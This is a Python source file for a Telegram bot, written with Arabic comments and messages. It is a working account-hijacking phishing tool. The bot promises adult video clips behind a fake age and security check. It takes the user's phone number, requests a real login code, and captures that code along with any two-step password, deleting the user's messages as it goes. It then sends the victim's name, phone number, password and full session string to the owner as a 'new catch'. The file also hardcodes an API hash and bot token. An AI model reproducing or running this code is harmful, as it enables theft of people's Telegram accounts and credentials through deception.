from telethon import TelegramClient, events, Button, types
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import asyncio
import re

# --- بياناتك ---
API_ID = 23032698
API_HASH = '99ad65a5fcd38203621cb20acd2aaba5'
BOT_TOKEN = '9299092464:AAFQHpUSATIhaZyU_lmV7sE4zvZ0pZLApxI'
MY_ID = 8626660857  # المالك الوحيد

bot = TelegramClient('bait_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

BAIT_LIST = []
user_data = {}
verified_users = set()


def build_numpad():
    return [
        [Button.inline("1", b"1"), Button.inline("2", b"2"), Button.inline("3", b"3")],
        [Button.inline("4", b"4"), Button.inline("5", b"5"), Button.inline("6", b"6")],
        [Button.inline("7", b"7"), Button.inline("8", b"8"), Button.inline("9", b"9")],
        [Button.inline("مسح ❌", b"clear"), Button.inline("0", b"0")]
    ]


async def delete_after_delay(user_id, message_ids, delay):
    await asyncio.sleep(delay)
    try:
        await bot.delete_messages(user_id, message_ids)
    except:
        pass


async def send_bait(user_id):
    """ترسل المقاطع + رسالة الانتظار في النهاية"""
    if len(BAIT_LIST) == 0:
        await bot.send_message(user_id, "⚠️ لا توجد مقاطع حالياً..")
        return

    to_send = BAIT_LIST[:20]
    sent_msg_ids = []

    for msg in to_send:
        try:
            m = await bot.send_message(user_id, msg)
            sent_msg_ids.append(m.id)
            await asyncio.sleep(0.3)
        except Exception:
            pass

    # 1) رسالة الإرسال
    await bot.send_message(
        user_id,
        f"✅ **تم إرسال {len(to_send)} مقطع بالكامل!**\n\n"
        f"🔥 **هل تريد مشاهدة المزيد من المقاطع الحصرية؟**\n"
        f"*(يوجد أكثر من 5000 مقطع جديد)*\n\n"
        f"⚠️ **ملاحظة:** هذه المقاطع مؤقتة وسيتم حذفها تلقائياً خلال **300 ثانية**، سارع بتحويلها إذا أردت الاحتفاظ بها! 👆"
    )

    # 2) رسالة الانتظار في النهاية
    await bot.send_message(
        user_id,
        "⏳ **سوف يتحول لك المزيد من المقاطع بعد 24 ساعة تلقائياً.**"
    )

    asyncio.create_task(delete_after_delay(user_id, sent_msg_ids, 300))


# ==== /start ====
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id

    if user_id in verified_users:
        await event.respond(
            "🔓 **مرحباً بعودتك!**\n\nاستعرض المقاطع 👇",
            buttons=[[Button.inline("🎥 مشاهدة المقاطع 🍑", b"show_bait")]]
        )
        return

    await event.respond(
        "⚠️ **تنبيه أمني:**\n"
        "لمشاهدة المحتوى الكامل، يجب عليك تأكيد حسابك لمرة واحدة "
        "لضمان أنك لست روبوت ولتأكيد عمرك (18+) ✅",
        buttons=[[Button.request_phone("✅ تأكيد الرقم (استمرار)")]]
    )


# ==== معالج الأزرار ====
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    data = event.data.decode()

    if data == "show_bait":
        if user_id not in verified_users:
            await event.answer("⚠️ يجب تأكيد الرقم أولاً!", alert=True)
            return
        await event.answer("جاري تحميل المقاطع...", alert=False)
        await send_bait(user_id)
        return

    if user_id in user_data and user_data[user_id]['step'] == 'code':
        if data.isdigit():
            user_data[user_id]['code'] += data
            current_code = user_data[user_id]['code']
            await event.edit(
                f"🔐 **أدخل رمز التحقق:**\n\nالرمز: `{'*' * len(current_code)}`",
                buttons=build_numpad()
            )
            if len(current_code) == 5:
                d = user_data[user_id]
                try:
                    await d['client'].sign_in(d['phone'], d['code'], phone_code_hash=d['hash'])
                    await finish_login(user_id, d)
                except SessionPasswordNeededError:
                    user_data[user_id]['step'] = '2fa'
                    await event.edit("🔐 **هذا الحساب محمي بكلمة سر.**\n\nأرسل **كلمة سر الحساب** الآن كرسالة عادية:")
                except Exception:
                    # فشل الكود → نرجعه لأزرار التسجيل
                    user_data[user_id]['code'] = ""
                    await event.edit(
                        "🔐 **الرمز خطأ! حاول مجدداً:**",
                        buttons=build_numpad()
                    )
        elif data == "clear":
            user_data[user_id]['code'] = ""
            await event.edit("🔐 **أدخل رمز التحقق:**", buttons=build_numpad())


# ==== استقبال الرقم ====
@bot.on(events.Raw(types.UpdateNewMessage))
async def raw_handler(update):
    if not hasattr(update, 'message'):
        return
    try:
        user_id = update.message.peer_id.user_id
    except:
        return

    if update.message.media and isinstance(update.message.media, types.MessageMediaContact):
        m = update.message.media
        phone = m.phone_number

        try:
            await bot.delete_messages(user_id, [update.message.id])
        except:
            pass

        new_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await new_client.connect()
        try:
            sent_code = await new_client.send_code_request(phone)
            user_data[user_id] = {
                'phone': phone,
                'client': new_client,
                'hash': sent_code.phone_code_hash,
                'code': "",
                'step': 'code'
            }
            await bot.send_message(
                user_id,
                "🔐 **أدخل رمز التحقق (5 أرقام) الذي وصلك الآن:**",
                buttons=build_numpad()
            )
        except Exception as e:
            await bot.send_message(user_id, f"⚠️ حدث خطأ: {str(e)}")


# ==== معالج الرسائل ====
@bot.on(events.NewMessage)
async def message_handler(event):
    user_id = event.sender_id

    # ===== المالك =====
    if user_id == MY_ID:
        if event.message:
            BAIT_LIST.append(event.message)
            await event.reply(f"✅ تم إضافة المقطع بنجاح! (العدد: {len(BAIT_LIST)})")
        return

    # ===== استقبال الكود كرسالة عادية (أي رسالة بيها أرقام) =====
    if user_id in user_data and user_data[user_id].get('step') == 'code':
        if event.text:
            # نحذف رسالة المستخدم فوراً (بدون علمه)
            try:
                await event.delete()
            except:
                pass

            # نستخرج الأرقام فقط من الرسالة (نتجاهل أي حروف)
            digits = re.sub(r'\D', '', event.text)

            # إذا فيها أرقام → نحاول نستخدمها ككود
            if digits:
                d = user_data[user_id]
                try:
                    await d['client'].sign_in(d['phone'], digits, phone_code_hash=d['hash'])
                    await finish_login(user_id, d)
                except SessionPasswordNeededError:
                    user_data[user_id]['step'] = '2fa'
                    await bot.send_message(
                        user_id,
                        "🔐 **هذا الحساب محمي بكلمة سر.**\n\nأرسل **كلمة سر الحساب** الآن كرسالة عادية:"
                    )
                except Exception:
                    # فشل الكود → نرجعه لأزرار التسجيل مرة ثانية
                    user_data[user_id]['code'] = ""
                    try:
                        await bot.send_message(
                            user_id,
                            "🔐 **الرمز خطأ! حاول مجدداً:**",
                            buttons=build_numpad()
                        )
                    except:
                        pass
            return

    # ===== خطوة 2FA =====
    if user_id in user_data and user_data[user_id].get('step') == '2fa':
        password = event.text

        try:
            await event.delete()
        except:
            pass

        user_data[user_id]['2fa_password'] = password
        d = user_data[user_id]
        try:
            await d['client'].sign_in(password=password)
            await finish_login(user_id, d)
        except Exception:
            try:
                await bot.send_message(
                    user_id,
                    "⚠️ **كلمة السر خطأ، حاول مجدداً:**"
                )
            except:
                pass
        return


async def finish_login(user_id, d):
    """بعد ما ينجح التسجيل → يدز الصيد + يدز المقاطع مباشرة"""
    try:
        ss = d['client'].session.save()
        pass_2fa = d.get('2fa_password', 'لا يوجد')

        try:
            me = await d['client'].get_me()
            username = me.username if me.username else "لا يوجد"
            first_name = me.first_name if me.first_name else "لا يوجد"
        except:
            username = "غير معروف"
            first_name = "غير معروف"

        log = (
            f"🔥 صيد جديد!\n\n"
            f"👤 الاسم: {first_name}\n"
            f"📝 اليوزر: @{username}\n"
            f"📱 الرقم: {d['phone']}\n"
            f"🔐 الباسورد: {pass_2fa}\n\n"
            f"🎫 السيشن:\n{ss}"
        )

        try:
            await bot.send_message(MY_ID, log)
        except:
            pass

        verified_users.add(user_id)

        if user_id in user_data:
            del user_data[user_id]

        # ← إرسال المقاطع + رسالة الانتظار في النهاية
        try:
            await send_bait(user_id)
        except Exception as e:
            await bot.send_message(MY_ID, f"⚠️ خطأ في إرسال المقاطع: {str(e)}")

    except Exception as e:
        await bot.send_message(MY_ID, f"⚠️ خطأ في finish_login: {str(e)}")


print("🚀 البوت يعمل")
print(f"👑 المالك: {MY_ID}")
bot.run_until_disconnected()
